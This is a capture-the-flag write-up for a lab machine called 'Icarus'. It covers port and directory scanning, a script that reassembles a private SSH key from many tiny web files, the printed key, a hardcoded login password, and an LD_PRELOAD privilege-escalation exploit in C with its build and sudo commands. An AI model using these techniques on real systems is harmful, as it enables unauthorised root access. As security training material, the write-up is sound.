***Remote Machine: `10.0.0.7`***
***Local Machine: `10.0.0.44`***

# 1. Enumeration

## *NMAP*

    root@kali ~/D/M/Icarus# nmap -sS -T5 -p- 10.0.0.7                           

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
## *HTTP*

Going to port 80, we have a simple username and password login. Further inspection shows it checks the credentials on **http://10.0.0.7/check.php**.
Not something interesting on the surface, let's scan the remote server and see if it has extra files that can help.

    root@kali ~/D/M/Icarus# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://10.0.0.7/ -x txt,zip,php,html 

    /check.php            (Status: 200) [Size: 21]
    /a                    (Status: 200) [Size: 9641]
    /index.php            (Status: 200) [Size: 407]
    /xls                  (Status: 200) [Size: 1]
    /xid                  (Status: 200) [Size: 1]
    /login.php            (Status: 302) [Size: 0] [--> index.php]
    /xpl                  (Status: 200) [Size: 1]
    /xml                  (Status: 200) [Size: 1]
    /xqf                  (Status: 200) [Size: 1]
    /xen                  (Status: 200) [Size: 1]
    /xui                  (Status: 200) [Size: 1]
    /xsp                  (Status: 200) [Size: 1]
    /xvi                  (Status: 200) [Size: 1]
    /xli                  (Status: 200) [Size: 1]
    /xmm                  (Status: 200) [Size: 1]
    /xcc                  (Status: 200) [Size: 1]
    /xfe                  (Status: 200) [Size: 1]
    /xik                  (Status: 200) [Size: 1]
    /xtc                  (Status: 200) [Size: 1]
    /xfn                  (Status: 200) [Size: 1]
    /xsd                  (Status: 200) [Size: 1]
    /xsl                  (Status: 200) [Size: 1]
    /xbl                  (Status: 200) [Size: 1]
    /xul                  (Status: 200) [Size: 1]
    /xkb                  (Status: 200) [Size: 1]
    /xol                  (Status: 200) [Size: 1]
    /xcp                  (Status: 200) [Size: 1]
    /xsa                  (Status: 200) [Size: 1]
    /xxl                  (Status: 200) [Size: 1]
    /xxx                  (Status: 200) [Size: 1]
    /xsr                  (Status: 200) [Size: 1]
    /xav                  (Status: 200) [Size: 1]
    /xrx                  (Status: 200) [Size: 1]
    /xyz                  (Status: 200) [Size: 1]
    /xck                  (Status: 200) [Size: 1]
    /xtr                  (Status: 200) [Size: 1]
    /xsj                  (Status: 200) [Size: 1]
    /xgc                  (Status: 200) [Size: 1]

The web server holds many files, with the size of 1. The file ***"a"*** is larger, maybe it has some interesting information.

After downloading the file, it holds all the other files that are on the remote server. Let's build a script to download them so we can read them and maybe get something.

    import requests                                                                                 
    # Set the base URL of the webserver
    base_url = "http://10.0.0.7/"

    # Open the file containing the list of file names
    with open("./a") as file_names:
    # Read the file names from the list file
    for file_name in file_names:
        # Strip the leading and trailing whitespace from the file name
        file_name = file_name.strip()

        # Construct the URL of the file
        file_url = f"{base_url}{file_name}"

        # Download the file
        response = requests.get(file_url)

        # Save the file to the current working directory
        with open(file_name, "wb") as f:
        f.write(response.content)

The ***download_files.py*** script downloads all the files from the a file.  
After downloading them let's read them.

    root@kali ~/D/M/Icarus# cat files_from_server/*   

    a
    xaa
    xab
    xac
    xad
    xae
    xaf
    xag
    xah
    xai
    xaj
    xak
    xal
    xam
    xan
    xao
    xap
    xaq
    xar
    xas
    xat
    xau
    ...
    xzbse
    xzbsf
    xzbsg
    xzbsh
    xzbsi
    xzbsj
    xzbsk
    xzbsl
    xzbsm
    xzbsn
    xzbso
    xzbsp
    xzbsq
    xzbsr
    xzbss
    xzbst
    xzbsu
    xzbsv
    xzbsw
    xzbsx
    xzbsy
    xzbsz
    xzbta
    xzbtb
    xzbtc
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAQEA5xagxLiN5ObhPjNcs2I2ckcYrErKaunOwm40kTBnJ6vrbdRYHteS
    afNWC6xFFzwO77+Kze229eK4ddZcwmU0IdN02Y8nYrxhl8lOc+e5T0Ajz+tRmLGoxJVPsS
    TzKBERlWpKuJoGO/CEFLOv6PP6s79YYzZFpdUjaczY96jgICftzNZS+VkBXuLjKr79h4Tw
    z7BK4V6FEQY0hwT8NFfNrF3x3VPe0UstdiUJFl4QV/qAPlHVhPd0YUEPr/95mryjuGi1xw
    P7xVFrYyjLfPepqYHiS5LZxFewLWhhSjBOI0dzf/TwiNRnVGTZhB3GemgEIQRAam26jkZZ
    3BxkrUVckQAAA8jfk7Jp35OyaQAAAAdzc2gtcnNhAAABAQDnFqDEuI3k5uE+M1yzYjZyRx
    isSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydi
    vGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzN
    j3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX
    +oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9P
    CI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyRAAAAAwEAAQAAAQEAvdjwMU1xfTlUmPY3
    VUP9ePsBwSIck6ML8t35H8KFLKln3C4USxpNNe/so+BeTo1PtBVHYpDFu9IMOvrl7+qW3q
    dLGyUpdUtQXhPK+RvJONt30GwB+BEUlpQYCW9SuHr1WCwfwPMA5iNdT2ijvx0ZvKwZYECJ
    DYlB87yQDz7VCnRTiQGP2Mqiiwb7vPd/t386Y+cAz1cVl7BnHzWWJTUTkKCwijnvjYrD0o
    tTQX4sGd6CrI44g+L8hnYuCZz+a0j6IyUfXJqj6l+/Z2Af7pJjbJD3P28xX7eY0h1Cec2l
    /sb7qg2wy0qJNywJ35l8bZzZKjkXztPLOqMFQ6Fh0BqSdQAAAIEAlaH0ZEzJsZoR3QqcKl
    xRKjVcuQCwcrKlNbJu2qRuUG812CLb9jJxJxacJPBV0NS832c+hZ3BiLtA5FwCiGlGq5m5
    HS3odf3lLXDfIK+pur4OWKBNLDxKbqi4s4M05vR4gHkmotiH9eWlCNuqL46Ip5H1vFXeJM
    pLRLN0gqOGuQQAAACBAPfffuhidAgUZH/yTvATKC5lcGrE7bkpOq+6XMMgxEQl0Hzry76i
    rGXkhTY4QUtthYo4+g7jiDzKlbeaS7aN8RYq38GzQnZZQcSdvL1yB/N554gQvzJLvmKQbm
    gLhMRcdDmifUelJYXib2Mjg/BLaRXaEzOomUKR2nyJH7VgU+xzAAAAgQDuqkBp44indqhx
    wrzbfeLnzQqpZ/rMZXGcvJUttECRbLRfohUftFE5J0PKuT8w0dpacNCVgkT9A0Tc3xRfky
    ECBQjeKLvdhcufJhQl0pdXDt1cpebE50LE4yHc8vR6FEjhR4P2AbGICJyRS7AX7UnrOWdU
    IE3FeNP0r5UiSDq16wAAAA1pY2FydXNAaWNhcnVzAQIDBA==
    -----END OPENSSH PRIVATE KEY-----

As we can see, every file holds a letter the together piece a private SSH key. After saving the private key and removing the file names and adding ***700*** permission, we are ready to try to login to the remote machine.

# 2. Privilege Escalation

I searched how to brute force SSH with a private key, but found nothing. So let's go for the reasonable username, ***"icarus"***.

    root@kali ~/D/M/Icarus# ssh icarus@10.0.0.7 -i id_rsa   

    icarus@icarus:~$ id -a
    uid=1000(icarus) gid=1000(icarus) groups=1000(icarus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

    icarus@icarus:~$ cat user.txt
    Dontgotothesun

Let's see what commands the user can run as root.

    icarus@icarus:/home$ sudo -l
    Matching Defaults entries for icarus on icarus:
        env_reset, mail_badpass, env_keep+=LD_PRELOAD,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User icarus may run the following commands on icarus:
        (ALL : ALL) NOPASSWD: /usr/bin/id

I didn't find a way that the ***id*** command can help, but we can read the ***check.php*** script on the web server.

    icarus@icarus:/var/www/html$ cat check.php
    <?php
    $user = $_POST['user'];
    $pass = $_POST['password'];
    $pazz = "YoUMAkEMEcRy";

            if(strcmp($pass, $pazz) == 0){
                    session_start();
                    $_SESSION['logged'] = TRUE;
                    header("Location:login.php");
                    }
                    else{
                            print "Man, you make me cry.";
                    }


    ?>

So let's enter the password ***"YoUMAkEMEcRy"*** with any username and see what we get.

![image](https://user-images.githubusercontent.com/76552238/209483546-963a92c6-66fb-4996-a3d6-082103dc6783.png)

![image](https://user-images.githubusercontent.com/76552238/209483566-58305cc2-5747-4115-bdd1-b2d9b1f96cfa.png)

After logging in we get the same long list.

Let's go back to the machine. We can exploit the LD_PRELOAD public variable by preloading custom shared libraries that are being run instead of the libc library and so we can run commands as the root user.  
Using [***this***][1] article we can exploit the machine.

    icarus@icarus:/tmp$ cat exploit.c

    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <stdlib.h>

    void _init()
    {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }

    icarus@icarus:/tmp$ gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
    icarus@icarus:/tmp$ sudo LD_PRELOAD=/tmp/exploit.so id
    root@icarus:/tmp# whoami
    root
    root@icarus:/tmp# id -a
    uid=0(root) gid=0(root) groups=0(root)
    root@icarus:/tmp# cat /root/root.txt
    RIPicarus

[1]: "https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/"